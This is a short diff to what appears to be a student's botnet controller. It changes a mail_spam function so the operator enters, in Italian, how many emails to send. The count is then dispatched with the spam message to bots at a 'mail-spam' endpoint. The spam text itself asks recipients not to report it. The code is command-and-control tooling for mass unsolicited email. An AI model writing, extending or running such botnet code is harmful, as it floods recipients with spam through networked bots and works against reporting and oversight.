@@ -149,10 +149,14 @@ def mail_spam():
         mail_object = "Spam email"
         message = "I'm so sorry for this spam email, but I'm testing my botnet. Please don't report me, I'm just a " \
                   "student. Thank you for your understanding."
+
+        number_of_mails = int(input("Quante email vuoi inviare? "))
+
         data = {
             "emails": emails,
             "message": message,
-            "mail_object": mail_object
+            "mail_object": mail_object,
+            "number_of_emails": number_of_mails
         }
         find_bot(path='mail-spam', method="POST", json=data)
 
